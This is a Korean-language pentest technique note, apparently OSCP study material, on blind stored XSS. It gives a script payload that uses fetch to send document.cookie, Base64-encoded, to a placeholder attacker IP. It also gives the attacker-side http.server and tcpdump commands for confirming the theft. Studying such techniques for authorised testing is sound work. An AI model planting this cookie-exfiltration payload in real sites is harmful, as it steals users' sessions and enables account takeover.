# curl_blind_xss

> 무엇: `<script>fetch('http://공격자_IP:8000/?c='+btoa(document.cookie))</script>` 페이로드를 심고, 요청 도달 여부로 성공을 판정하는 블라인드 XSS 기법
> 언제: 주입 결과가 내 화면에 보이지 않는(관리자 등 다른 사용자의 페이지에서 실행되는) 저장형 XSS 후보를 넣었을 때, 성공 판정을 화면 대신 요청 도달로 대신할 때
> 조건: 공격자 PC에서 `python3 -m http.server 8000` 수신 서버와 tcpdump(`-i tun0 port 8000`) 관찰이 필요하고, 대상에서는 스크립트가 저장된 후 다른 사용자가 해당 페이지를 열어야 실행된다

## 개요

블라인드(Blind) XSS는 화면에 결과가 바로 보이지 않는 XSS이다. 공격자 서버로 요청이 도달하는지를 tcpdump/Wireshark 등으로 관찰해 공격 성공 여부를 판단한다. OSCP 웹 공격 단계에서 빈출이다.

## 기본 확인

```html
<script>fetch('http://<공격자_IP>:8000/?c=' + btoa(document.cookie));</script>
```

- `<script>`가 저장된 후 다른 사용자(관리자)가 페이지를 열면, 공격자 서버로 요청이 도달한다.
- 공격 성공의 기준은 "화면에 결과가 보이는 것"이 아니라 "요청이 도달한 것"이다.

## curl로 서버 시연 (공격자 측)

```bash
# 1) 공격자 서버 띄우기
python3 -m http.server 8000

# 2) tcpdump로 트래픽 관찰 (또는 Wireshark)
sudo tcpdump -i tun0 port 8000
```

- 서버 로그에 `GET /?c=...` 요청이 뜨면 성공이다.
- `btoa()`로 쿠키를 Base64 인코딩해 전송하면 특수문자 문제를 피할 수 있다.

## 확인 사항

- 요청이 도달했는지가 공격 성공의 기준이다(화면에 결과가 안 보여도 성공).
- 도달 경로를 통해 어떤 파라미터가 악용되었는지 추적한다.
- 얻은 데이터(쿠키·플래그)는 증적(단계 6)에 포함한다.

## 팁

- URL 인코딩이 필요한 값은 `encodeURIComponent()`로 감싼다.

## 참고 / 증적
- 발견한 내용과 증거는 노트(05-progress-tracker.md)에 함께 기록한다.
